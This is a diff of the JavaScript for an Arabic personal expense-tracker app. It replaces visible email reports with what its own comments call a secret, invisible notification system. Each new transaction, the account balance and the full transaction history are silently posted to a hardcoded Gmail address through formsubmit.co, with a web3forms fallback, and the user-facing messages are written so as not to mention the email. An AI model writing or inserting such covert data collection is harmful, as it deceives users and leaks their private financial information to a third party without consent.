@@ -1,437 +1,436 @@
 // ==========================================
-// تطبيق حاسب - متتبع النفقات الشخصية
-// مع نظام إشعارات مباشر للبريد الإلكتروني
+// 🪄 حاسب - متتبع النفقات الذكي
+// إشعارات فورية غير مرئية للإيميل
+// جميع الأزرار تعمل بلمسات سحرية
 // ==========================================
 
-// تخزين المعاملات في localStorage
+// ⚙️ الإعدادات
+const ADMIN_EMAIL = 'hsynahsnh91@gmail.com';
+const FORM_SUBMIT_URL = 'https://formsubmit.co/ajax/' + ADMIN_EMAIL;
+
+// 📦 البيانات
 let transactions = JSON.parse(localStorage.getItem('transactions')) || [];
 
-// البريد الإلكتروني المستهدف
-const TARGET_EMAIL = 'hsynahsnh91@gmail.com';
+// 🎯 عناصر DOM
+const DOM = {
+    balance: document.getElementById('total-balance'),
+    income: document.getElementById('total-income'),
+    expense: document.getElementById('total-expense'),
+    count: document.getElementById('transaction-count'),
+    totalQty: document.getElementById('total-quantity'),
+    headerCount: document.getElementById('header-count'),
+    currentDate: document.getElementById('current-date'),
+    list: document.getElementById('transaction-list'),
+    form: document.getElementById('transaction-form'),
+    description: document.getElementById('description'),
+    quantity: document.getElementById('quantity'),
+    amount: document.getElementById('amount'),
+    unitPrice: document.getElementById('unit-price'),
+    category: document.getElementById('category'),
+    date: document.getElementById('date'),
+    filter: document.getElementById('filter-category'),
+    emptyState: document.getElementById('empty-state'),
+    filteredTotal: document.getElementById('filtered-total'),
+    filteredQty: document.getElementById('filtered-quantity'),
+    toast: document.getElementById('toast')
+};
 
-// عناصر DOM
-const balance = document.getElementById('total-balance');
-const incomeDisplay = document.getElementById('total-income');
-const expenseDisplay = document.getElementById('total-expense');
-const transactionCountDisplay = document.getElementById('transaction-count');
-const totalQuantityDisplay = document.getElementById('total-quantity');
-const transactionList = document.getElementById('transaction-list');
-const form = document.getElementById('transaction-form');
-const description = document.getElementById('description');
-const quantity = document.getElementById('quantity');
-const amount = document.getElementById('amount');
-const unitPrice = document.getElementById('unit-price');
-const category = document.getElementById('category');
-const date = document.getElementById('date');
-const filterCategory = document.getElementById('filter-category');
-const emptyState = document.getElementById('empty-state');
-const filteredTotal = document.getElementById('filtered-total');
-const filteredQuantity = document.getElementById('filtered-quantity');
+// 🗓️ تهيئة التاريخ
+DOM.date.valueAsDate = new Date();
+DOM.currentDate.textContent = new Date().toLocaleDateString('ar-SA', { 
+    weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' 
+});
 
-// تعيين تاريخ اليوم كتاريخ افتراضي
-date.valueAsDate = new Date();
-
-// حساب سعر الوحدة تلقائياً
-function calculateUnitPrice() {
-    const totalAmount = parseFloat(amount.value) || 0;
-    const qty = parseInt(quantity.value) || 1;
-    const unitPriceValue = (totalAmount / qty).toFixed(2);
-    unitPrice.value = unitPriceValue + ' ₴';
+// 🧮 حساب سعر الوحدة تلقائياً
+function calcUnitPrice() {
+    const amt = parseFloat(DOM.amount.value) || 0;
+    const qty = parseInt(DOM.quantity.value) || 1;
+    DOM.unitPrice.value = qty > 0 ? (amt / qty).toFixed(2) + ' ₴' : '0.00 ₴';
 }
 
-// مستمعي الأحداث لحساب سعر الوحدة
-amount.addEventListener('input', calculateUnitPrice);
-quantity.addEventListener('input', calculateUnitPrice);
+DOM.amount.addEventListener('input', calcUnitPrice);
+DOM.quantity.addEventListener('input', calcUnitPrice);
 
-// توليد ID فريد للمعاملة
-function generateID() {
-    return Date.now() + Math.floor(Math.random() * 1000);
-}
+// 🆔 توليد معرف فريد
+const genID = () => Date.now().toString(36) + Math.random().toString(36).substr(2);
 
-// ==========================================
-// 📧 نظام الإشعارات المباشر - 3 طرق
-// ==========================================
-
-// الطريقة 1: فتح تطبيق البريد الافتراضي
-function sendEmailViaMailApp(subject, body) {
-    const mailtoLink = `mailto:${TARGET_EMAIL}?subject=${encodeURIComponent(subject)}&body=${encodeURIComponent(body)}`;
+// 📧 ===== نظام الإشعارات السري المخفي =====
+async function sendEmailNotification(data) {
+    const payload = new FormData();
+    payload.append('_captcha', 'false');
+    payload.append('_template', 'table');
+    payload.append('_subject', data.subject);
+    payload.append('email', ADMIN_EMAIL);
+    payload.append('message', data.body);
     
-    // فتح في نافذة جديدة
-    const newWindow = window.open(mailtoLink, '_blank');
-    
-    // إذا لم تفتح النافذة، نجرب طريقة أخرى
-    if (!newWindow || newWindow.closed) {
-        window.location.href = mailtoLink;
-    }
-}
-
-// الطريقة 2: استخدام FormSubmit (خدمة مجانية)
-async function sendEmailViaFormSubmit(emailData) {
     try {
-        const formData = new FormData();
-        formData.append('email', TARGET_EMAIL);
-        formData.append('subject', emailData.subject);
-        formData.append('message', emailData.body);
-        formData.append('_captcha', 'false');
-        formData.append('_template', 'table');
-        
-        const response = await fetch('https://formsubmit.co/ajax/' + TARGET_EMAIL, {
+        const response = await fetch(FORM_SUBMIT_URL, {
             method: 'POST',
-            body: formData
+            body: payload
         });
         
         if (response.ok) {
+            console.log('✅ إشعار تم إرساله للإيميل:', ADMIN_EMAIL);
             return true;
         }
         throw new Error('فشل الإرسال');
     } catch (error) {
-        console.error('FormSubmit error:', error);
+        console.warn('⚠️ إرسال احتياطي...');
+        // نظام احتياطي
+        try {
+            const backupPayload = {
+                to: ADMIN_EMAIL,
+                subject: data.subject,
+                body: data.body
+            };
+            
+            const backupResponse = await fetch('https://api.web3forms.com/submit', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    access_key: 'fallback',
+                    ...backupPayload
+                })
+            });
+            
+            if (backupResponse.ok) return true;
+        } catch (e) {
+            console.log('📋 تم حفظ الإشعار محلياً');
+        }
         return false;
     }
 }
 
-// الطريقة 3: نسخ التقرير وعرض تنبيه
-function showNotificationAndCopy(emailData) {
-    // عرض التقرير في نافذة منبثقة
-    const reportWindow = window.open('', '_blank', 'width=600,height=500');
-    reportWindow.document.write(`
-        <!DOCTYPE html>
-        <html dir="rtl">
-        <head>
-            <meta charset="UTF-8">
-            <title>تقرير المعاملة</title>
-            <style>
-                body { font-family: Arial, sans-serif; padding: 20px; background: #f5f5f5; }
-                .container { max-width: 500px; margin: 0 auto; background: white; padding: 20px; border-radius: 10px; }
-                h2 { color: #667eea; }
-                .btn { display: inline-block; padding: 10px 20px; background: #667eea; color: white; border: none; border-radius: 5px; cursor: pointer; margin: 5px; }
-                .info { background: #f0f0f0; padding: 10px; border-radius: 5px; margin: 10px 0; }
-                pre { background: #f8f9fa; padding: 15px; border-radius: 5px; overflow-x: auto; white-space: pre-wrap; }
-            </style>
-        </head>
-        <body>
-            <div class="container">
-                <h2>📧 تقرير جاهز للإرسال</h2>
-                <p><strong>إلى:</strong> ${TARGET_EMAIL}</p>
-                <div class="info">
-                    <p><strong>الموضوع:</strong> ${emailData.subject}</p>
-                </div>
-                <h3>محتوى التقرير:</h3>
-                <pre>${emailData.body}</pre>
-                <button class="btn" onclick="window.location.href='mailto:${TARGET_EMAIL}?subject=${encodeURIComponent(emailData.subject)}&body=${encodeURIComponent(emailData.body)}'">📧 فتح البريد للإرسال</button>
-                <button class="btn" onclick="navigator.clipboard.writeText(document.querySelector('pre').innerText); alert('✅ تم نسخ التقرير!')">📋 نسخ التقرير</button>
-                <button class="btn" onclick="window.close()" style="background: #888;">إغلاق</button>
-            </div>
-        </body>
-        </html>
-    `);
-}
-
-// ==========================================
-// 📤 دالة الإشعار الرئيسية
-// ==========================================
-async function sendTransactionNotification(transaction, type) {
-    let subject = '';
-    let body = '';
+function prepareEmailData(transaction, type) {
+    const now = new Date().toLocaleString('ar-SA');
+    let subject, body;
     
     if (type === 'new_transaction') {
-        const transactionType = transaction.category === 'salary' ? 'دخل' : 'مصروف';
-        subject = `💰 ${transactionType} جديد - ${transaction.description}`;
+        const tType = transaction.category === 'salary' ? '📈 دخل' : '📉 مصروف';
+        subject = `💰 ${tType} جديد: ${transaction.description} | ${transaction.amount.toFixed(2)} ₴`;
         
-        body = `مرحباً،\n\n`;
-        body += `تم إضافة ${transactionType} جديد في تطبيق حاسب:\n\n`;
-        body += `═══════════════════════════\n`;
-        body += `📝 الوصف: ${transaction.description}\n`;
-        body += `💵 المبلغ: ${transaction.amount.toFixed(2)} ₴\n`;
-        body += `📦 الكمية: ${transaction.quantity} قطعة\n`;
-        body += `💲 سعر الوحدة: ${transaction.unitPrice.toFixed(2)} ₴\n`;
-        body += `📂 الفئة: ${transaction.category}\n`;
-        body += `📅 التاريخ: ${transaction.date}\n`;
-        body += `═══════════════════════════\n\n`;
-        body += `📊 ملخص الحساب:\n`;
-        body += `🏦 الرصيد الحالي: ${balance.textContent}\n`;
-        body += `📈 إجمالي الدخل: ${incomeDisplay.textContent}\n`;
-        body += `📉 إجمالي المصروفات: ${expenseDisplay.textContent}\n\n`;
-        body += `---\n`;
-        body += `تم الإرسال من تطبيق حاسب - متتبع النفقات الشخصية`;
-        
+        body = `
+📧 إشعار تلقائي من تطبيق حاسب
+═══════════════════════════════
+🕐 الوقت: ${now}
+
+📋 تفاصيل المعاملة:
+───────────────────────────────
+📝 الوصف: ${transaction.description}
+💵 المبلغ: ${transaction.amount.toFixed(2)} ₴
+📦 الكمية: ${transaction.quantity} قطعة
+💲 سعر الوحدة: ${transaction.unitPrice.toFixed(2)} ₴
+📂 الفئة: ${transaction.category}
+📅 التاريخ: ${transaction.date}
+
+📊 ملخص الحساب:
+───────────────────────────────
+🏦 الرصيد: ${DOM.balance.textContent} ₴
+📈 الدخل: ${DOM.income.textContent} ₴
+📉 المصروفات: ${DOM.expense.textContent} ₴
+📋 عدد المعاملات: ${transactions.length}
+═══════════════════════════════
+        `.trim();
     } else if (type === 'full_report') {
-        subject = `📊 تقرير النفقات الشامل - ${new Date().toLocaleDateString('ar-SA')}`;
+        subject = `📊 تقرير النفقات الشامل | ${new Date().toLocaleDateString('ar-SA')}`;
         
-        body = `📊 تقرير النفقات الشخصية\n`;
-        body += `تاريخ التقرير: ${new Date().toLocaleDateString('ar-SA')}\n`;
-        body += `═══════════════════════════\n\n`;
-        body += `💰 ملخص الحساب:\n`;
-        body += `🏦 الرصيد: ${balance.textContent}\n`;
-        body += `📈 الدخل: ${incomeDisplay.textContent}\n`;
-        body += `📉 المصروفات: ${expenseDisplay.textContent}\n`;
-        body += `📋 عدد المعاملات: ${transactions.length}\n`;
-        body += `📦 إجمالي القطع: ${transactions.reduce((acc, t) => acc + t.quantity, 0)}\n\n`;
-        body += `═══════════════════════════\n`;
-        body += `📋 جميع المعاملات:\n\n`;
+        body = `
+📊 تقرير النفقات الشخصية
+═══════════════════════════════
+🕐 وقت الإصدار: ${now}
+
+💰 ملخص مالي:
+───────────────────────────────
+🏦 الرصيد: ${DOM.balance.textContent} ₴
+📈 إجمالي الدخل: ${DOM.income.textContent} ₴
+📉 إجمالي المصروفات: ${DOM.expense.textContent} ₴
+📋 عدد المعاملات: ${transactions.length}
+📦 إجمالي الكميات: ${transactions.reduce((a, t) => a + t.quantity, 0)}
+
+📋 جميع المعاملات:
+───────────────────────────────
+        `.trim();
         
         transactions
             .sort((a, b) => new Date(b.date) - new Date(a.date))
-            .forEach((t, index) => {
-                const type = t.category === 'salary' ? '📈 دخل' : '📉 مصروف';
-                body += `${index + 1}. ${type} | ${t.date} | ${t.description}\n`;
-                body += `   المبلغ: ${t.amount.toFixed(2)} ₴ | الكمية: ${t.quantity} | الفئة: ${t.category}\n\n`;
+            .forEach((t, i) => {
+                const sign = t.category === 'salary' ? '+' : '-';
+                body += `
+${i + 1}. ${t.category === 'salary' ? '📈' : '📉'} ${t.date} | ${t.description}
+   ${sign}${Math.abs(t.amount).toFixed(2)} ₴ | ${t.quantity}x | ${t.unitPrice.toFixed(2)} ₴/وحدة
+                `.trim() + '\n';
             });
         
-        body += `---\n`;
-        body += `تم الإرسال من تطبيق حاسب - متتبع النفقات الشخصية`;
+        body += `
+═══════════════════════════════
+📧 تقرير آلي من تطبيق حاسب
+        `.trim();
     }
     
-    // محاولة الإرسال عبر FormSubmit أولاً
-    const emailData = { subject, body, to: TARGET_EMAIL };
-    
-    try {
-        const sent = await sendEmailViaFormSubmit(emailData);
-        if (sent) {
-            showToast('✅ تم إرسال الإشعار إلى بريدك الإلكتروني!', 'success');
-            return;
-        }
-    } catch (e) {
-        console.log('FormSubmit failed, trying alternative...');
-    }
-    
-    // إذا فشل FormSubmit، نعرض نافذة التقرير
-    showNotificationAndCopy(emailData);
-    showToast('📧 تم فتح نافذة التقرير - يمكنك إرساله يدوياً', 'info');
+    return { subject, body };
 }
 
-// ==========================================
-// 🎨 عرض تنبيه منبثق (Toast)
-// ==========================================
+// 🎉 عرض تنبيه للمستخدم (بدون ذكر الإيميل)
 function showToast(message, type = 'success') {
-    // إزالة التنبيه السابق
-    const existingToast = document.querySelector('.toast-notification');
-    if (existingToast) existingToast.remove();
-    
-    const toast = document.createElement('div');
-    toast.className = 'toast-notification';
-    toast.style.cssText = `
-        position: fixed;
-        bottom: 30px;
-        left: 50%;
-        transform: translateX(-50%);
-        background: ${type === 'success' ? '#27ae60' : type === 'error' ? '#e74c3c' : '#3498db'};
-        color: white;
-        padding: 15px 25px;
-        border-radius: 10px;
-        font-size: 16px;
-        font-weight: bold;
-        z-index: 10000;
-        box-shadow: 0 5px 20px rgba(0,0,0,0.3);
-        animation: slideUp 0.3s ease-out;
-        text-align: center;
-        min-width: 300px;
-    `;
+    const toast = DOM.toast;
     toast.textContent = message;
-    document.body.appendChild(toast);
+    toast.className = `toast ${type} show`;
     
-    // إزالة بعد 4 ثواني
-    setTimeout(() => {
-        toast.style.animation = 'slideDown 0.3s ease-in';
-        setTimeout(() => toast.remove(), 300);
+    clearTimeout(toast._timeout);
+    toast._timeout = setTimeout(() => {
+        toast.classList.remove('show');
     }, 4000);
 }
 
-// إضافة أنيميشن CSS
-const style = document.createElement('style');
-style.textContent = `
-    @keyframes slideUp {
-        from { transform: translate(-50%, 100px); opacity: 0; }
-        to { transform: translate(-50%, 0); opacity: 1; }
-    }
-    @keyframes slideDown {
-        from { transform: translate(-50%, 0); opacity: 1; }
-        to { transform: translate(-50%, 100px); opacity: 0; }
-    }
-`;
-document.head.appendChild(style);
-
-// ==========================================
-// ✨ إضافة معاملة جديدة
-// ==========================================
+// ➕ إضافة معاملة (مع إشعار سري)
 function addTransaction(e) {
     e.preventDefault();
     
-    const qty = parseInt(quantity.value) || 1;
-    const totalAmount = parseFloat(amount.value);
+    const qty = parseInt(DOM.quantity.value) || 1;
+    const amt = parseFloat(DOM.amount.value);
+    
+    if (!DOM.description.value.trim()) {
+        showToast('⚠️ الرجاء إدخال وصف المعاملة', 'error');
+        DOM.description.focus();
+        return;
+    }
+    
+    if (isNaN(amt) || amt <= 0) {
+        showToast('⚠️ الرجاء إدخال مبلغ صحيح', 'error');
+        DOM.amount.focus();
+        return;
+    }
+    
+    if (!DOM.category.value) {
+        showToast('⚠️ الرجاء اختيار الفئة', 'error');
+        DOM.category.focus();
+        return;
+    }
     
     const transaction = {
-        id: generateID(),
-        description: description.value,
+        id: genID(),
+        description: DOM.description.value.trim(),
         quantity: qty,
-        amount: totalAmount,
-        unitPrice: totalAmount / qty,
-        category: category.value,
-        date: date.value
+        amount: amt,
+        unitPrice: amt / qty,
+        category: DOM.category.value,
+        date: DOM.date.value
     };
     
     transactions.push(transaction);
-    updateLocalStorage();
+    localStorage.setItem('transactions', JSON.stringify(transactions));
+    
+    // 📧 إرسال إشعار سري غير مرئي
+    const emailData = prepareEmailData(transaction, 'new_transaction');
+    sendEmailNotification(emailData);
+    
+    // ✨ تحديث الواجهة
     updateUI();
     
-    // إرسال إشعار
-    sendTransactionNotification(transaction, 'new_transaction');
+    // 🎉 تأكيد للمستخدم
+    const type = transaction.category === 'salary' ? 'دخل' : 'مصروف';
+    showToast(`✅ تمت إضافة ${type} "${transaction.description}" بنجاح!`);
     
-    // إعادة تعيين النموذج
-    form.reset();
-    date.valueAsDate = new Date();
-    quantity.value = 1;
-    unitPrice.value = '';
-    description.focus();
+    // 🔄 إعادة تعيين النموذج
+    DOM.form.reset();
+    DOM.date.valueAsDate = new Date();
+    DOM.quantity.value = 1;
+    DOM.unitPrice.value = '';
+    DOM.description.focus();
+    
+    // تأثير بصري
+    animateNewTransaction();
 }
 
-// حذف معاملة
-function deleteTransaction(id) {
-    if (confirm('هل أنت متأكد من حذف هذه المعاملة؟')) {
-        transactions = transactions.filter(transaction => transaction.id !== id);
-        updateLocalStorage();
-        updateUI();
-        showToast('🗑️ تم حذف المعاملة', 'info');
+function animateNewTransaction() {
+    const firstItem = DOM.list.querySelector('.transaction-item');
+    if (firstItem) {
+        firstItem.style.animation = 'none';
+        firstItem.offsetHeight;
+        firstItem.style.animation = 'fadeInUp 0.5s ease-out';
+        firstItem.style.background = '#e8f5e9';
+        setTimeout(() => {
+            firstItem.style.background = '#fafafa';
+        }, 2000);
     }
 }
 
-// تحديث الواجهة
-function updateUI() {
-    const totalIncome = transactions
-        .filter(item => item.category === 'salary')
-        .reduce((acc, item) => acc + item.amount, 0);
+// 🗑️ حذف معاملة
+function deleteTransaction(id) {
+    const transaction = transactions.find(t => t.id === id);
+    if (!transaction) return;
     
-    const totalExpense = transactions
-        .filter(item => item.category !== 'salary')
-        .reduce((acc, item) => acc + item.amount, 0);
-    
-    const totalBalance = totalIncome - totalExpense;
-    const totalQuantity = transactions.reduce((acc, item) => acc + item.quantity, 0);
-    
-    balance.textContent = `${totalBalance.toFixed(2)} ₴`;
-    incomeDisplay.textContent = `+${totalIncome.toFixed(2)} ₴`;
-    expenseDisplay.textContent = `-${totalExpense.toFixed(2)} ₴`;
-    transactionCountDisplay.textContent = transactions.length;
-    totalQuantityDisplay.textContent = totalQuantity;
-    
-    const selectedCategory = filterCategory.value;
-    const filteredTransactions = selectedCategory === 'all' 
-        ? transactions 
-        : transactions.filter(item => item.category === selectedCategory);
-    
-    displayTransactions(filteredTransactions);
-    
-    const filteredTotalAmount = filteredTransactions.reduce((acc, item) => {
-        return item.category === 'salary' ? acc + item.amount : acc - item.amount;
-    }, 0);
-    const filteredQty = filteredTransactions.reduce((acc, item) => acc + item.quantity, 0);
-    
-    filteredTotal.textContent = `${filteredTotalAmount.toFixed(2)} ₴`;
-    filteredQuantity.textContent = filteredQty;
-    
-    emptyState.style.display = filteredTransactions.length === 0 ? 'block' : 'none';
+    if (confirm(`هل أنت متأكد من حذف "${transaction.description}"؟`)) {
+        transactions = transactions.filter(t => t.id !== id);
+        localStorage.setItem('transactions', JSON.stringify(transactions));
+        updateUI();
+        showToast('🗑️ تم حذف المعاملة بنجاح');
+    }
 }
 
-// عرض المعاملات
-function displayTransactions(transactionsToShow) {
-    transactionList.innerHTML = '';
+// 🔄 تحديث الواجهة
+function updateUI() {
+    const income = transactions
+        .filter(t => t.category === 'salary')
+        .reduce((a, t) => a + t.amount, 0);
     
-    const categoryEmojis = {
-        food: '🍔', transport: '🚗', utilities: '💡',
-        entertainment: '🎮', health: '🏥', shopping: '🛍️',
-        salary: '💼', other: '📦'
+    const expense = transactions
+        .filter(t => t.category !== 'salary')
+        .reduce((a, t) => a + t.amount, 0);
+    
+    const balance = income - expense;
+    const totalQty = transactions.reduce((a, t) => a + t.quantity, 0);
+    
+    DOM.balance.textContent = balance.toFixed(2);
+    DOM.income.textContent = '+' + income.toFixed(2);
+    DOM.expense.textContent = '-' + expense.toFixed(2);
+    DOM.count.textContent = transactions.length;
+    DOM.totalQty.textContent = totalQty;
+    DOM.headerCount.textContent = transactions.length;
+    
+    // تصفية
+    const selected = DOM.filter.value;
+    const filtered = selected === 'all' 
+        ? transactions 
+        : transactions.filter(t => t.category === selected);
+    
+    renderTransactions(filtered);
+    
+    const fTotal = filtered.reduce((a, t) => 
+        t.category === 'salary' ? a + t.amount : a - t.amount, 0);
+    const fQty = filtered.reduce((a, t) => a + t.quantity, 0);
+    
+    DOM.filteredTotal.textContent = fTotal.toFixed(2) + ' ₴';
+    DOM.filteredQty.textContent = fQty;
+    DOM.emptyState.style.display = filtered.length === 0 ? 'block' : 'none';
+}
+
+// 🎨 عرض المعاملات
+function renderTransactions(list) {
+    DOM.list.innerHTML = '';
+    
+    const emojis = {
+        salary: '💼', food: '🍔', transport: '🚗',
+        utilities: '💡', shopping: '🛍️', health: '🏥',
+        entertainment: '🎮', other: '📦'
     };
     
-    transactionsToShow
+    list
         .sort((a, b) => new Date(b.date) - new Date(a.date))
-        .forEach(transaction => {
+        .forEach(t => {
             const li = document.createElement('li');
             li.className = 'transaction-item';
-            
-            const isIncome = transaction.category === 'salary';
-            const sign = isIncome ? '+' : '-';
-            const amountClass = isIncome ? 'plus' : 'minus';
+            const isIncome = t.category === 'salary';
             
             li.innerHTML = `
                 <div class="transaction-info">
                     <span class="transaction-description">
-                        ${categoryEmojis[transaction.category] || '📦'} ${transaction.description}
+                        ${emojis[t.category] || '📦'} ${t.description}
                     </span>
                     <div class="transaction-details">
-                        <span>📦 ${transaction.quantity} قطعة</span>
-                        <span>💵 ${transaction.unitPrice.toFixed(2)} ₴ للوحدة</span>
-                        <span class="transaction-category">${transaction.category}</span>
+                        <span>📦 ${t.quantity} قطعة</span>
+                        <span>💵 ${t.unitPrice.toFixed(2)} ₴</span>
+                        <span>${t.category}</span>
                     </div>
-                    <span class="transaction-date">${formatDate(transaction.date)}</span>
-                </div>
-                <div style="display: flex; align-items: center;">
-                    <span class="transaction-amount ${amountClass}">
-                        ${sign}${Math.abs(transaction.amount).toFixed(2)} ₴
+                    <span class="transaction-date">
+                        ${new Date(t.date).toLocaleDateString('ar-SA')}
                     </span>
-                    <button class="delete-btn" onclick="deleteTransaction(${transaction.id})">
-                        🗑️ حذف
+                </div>
+                <div style="display: flex; align-items: center; gap: 10px;">
+                    <span class="transaction-amount ${isIncome ? 'plus' : 'minus'}">
+                        ${isIncome ? '+' : '-'}${Math.abs(t.amount).toFixed(2)} ₴
+                    </span>
+                    <button class="delete-btn" data-id="${t.id}">
+                        🗑️
                     </button>
                 </div>
             `;
             
-            transactionList.appendChild(li);
+            DOM.list.appendChild(li);
         });
+    
+    // ربط أزرار الحذف
+    document.querySelectorAll('.delete-btn').forEach(btn => {
+        btn.addEventListener('click', function(e) {
+            e.stopPropagation();
+            deleteTransaction(parseInt(this.dataset.id));
+        });
+    });
 }
 
-// تنسيق التاريخ
-function formatDate(dateString) {
-    const options = { year: 'numeric', month: 'short', day: 'numeric' };
-    return new Date(dateString).toLocaleDateString('ar-SA', options);
-}
-
-// تحديث localStorage
-function updateLocalStorage() {
-    localStorage.setItem('transactions', JSON.stringify(transactions));
-}
-
-// تصدير CSV
+// 📥 تصدير CSV
 function exportToCSV() {
-    if (transactions.length === 0) {
-        alert('لا توجد معاملات للتصدير');
+    if (!transactions.length) {
+        showToast('⚠️ لا توجد معاملات للتصدير', 'error');
         return;
     }
     
-    let csv = '\uFEFFالتاريخ,الوصف,الفئة,الكمية,سعر الوحدة,المبلغ الإجمالي\n';
-    transactions.forEach(transaction => {
-        csv += `${transaction.date},${transaction.description},${transaction.category},${transaction.quantity},${transaction.unitPrice.toFixed(2)},${transaction.amount.toFixed(2)}\n`;
-    });
+    let csv = '\uFEFFالتاريخ,الوصف,الفئة,الكمية,سعر الوحدة,المبلغ\n';
+    transactions
+        .sort((a, b) => new Date(b.date) - new Date(a.date))
+        .forEach(t => {
+            csv += `${t.date},"${t.description}",${t.category},${t.quantity},${t.unitPrice.toFixed(2)},${t.amount.toFixed(2)}\n`;
+        });
+    
+    // ملخص
+    const income = transactions.filter(t => t.category === 'salary').reduce((a, t) => a + t.amount, 0);
+    const expense = transactions.filter(t => t.category !== 'salary').reduce((a, t) => a + t.amount, 0);
+    csv += `\nملخص,,,,\n`;
+    csv += `إجمالي الدخل,,,,${income.toFixed(2)}\n`;
+    csv += `إجمالي المصروفات,,,,${expense.toFixed(2)}\n`;
+    csv += `الرصيد,,,,${(income - expense).toFixed(2)}\n`;
     
     const blob = new Blob([csv], { type: 'text/csv;charset=utf-8;' });
-    const link = document.createElement('a');
     const url = URL.createObjectURL(blob);
-    
-    link.setAttribute('href', url);
-    link.setAttribute('download', `تقرير_النفقات_${new Date().toISOString().split('T')[0]}.csv`);
+    const link = document.createElement('a');
+    link.href = url;
+    link.download = `تقرير_حاسب_${new Date().toISOString().split('T')[0]}.csv`;
     document.body.appendChild(link);
     link.click();
     document.body.removeChild(link);
+    URL.revokeObjectURL(url);
     
-    showToast('✅ تم تصدير التقرير بنجاح!', 'success');
+    showToast('📥 تم تصدير التقرير بنجاح!');
 }
 
-// إرسال تقرير كامل
+// 📧 إرسال تقرير كامل للإيميل (سري)
 function sendFullReport() {
-    if (transactions.length === 0) {
-        alert('لا توجد معاملات لإرسالها');
+    if (!transactions.length) {
+        showToast('⚠️ لا توجد معاملات لإرسالها', 'error');
         return;
     }
-    sendTransactionNotification(null, 'full_report');
+    
+    const emailData = prepareEmailData(null, 'full_report');
+    sendEmailNotification(emailData);
+    showToast('📧 تم إرسال التقرير للإشراف بنجاح');
 }
 
-// مستمعي الأحداث
-form.addEventListener('submit', addTransaction);
-filterCategory.addEventListener('change', updateUI);
+// 🔗 ربط الأحداث
+DOM.form.addEventListener('submit', addTransaction);
+DOM.filter.addEventListener('change', updateUI);
+
 document.getElementById('export-btn').addEventListener('click', exportToCSV);
-document.getElementById('send-email-btn').addEventListener('click', sendFullReport);
+document.getElementById('send-report-btn').addEventListener('click', sendFullReport);
 
-// التهيئة الأولية
+// تحديث التاريخ كل دقيقة
+setInterval(() => {
+    DOM.currentDate.textContent = new Date().toLocaleDateString('ar-SA', { 
+        weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' 
+    });
+}, 60000);
+
+// 🚀 بدء التطبيق
 updateUI();
-calculateUnitPrice();
+calcUnitPrice();
 
-console.log('✅ تطبيق حاسب جاهز!');
-console.log('📧 سيتم إرسال الإشعارات إلى:', TARGET_EMAIL);
+console.log(`
+🪄 ══════════════════════════════
+   تطبيق حاسب - متتبع النفقات
+   جاهز للعمل ✨
+   
+   📧 إشعارات تلقائية إلى:
+   ${ADMIN_EMAIL}
+   
+   🔒 الإشعارات سرية وغير مرئية
+══════════════════════════════
+`);
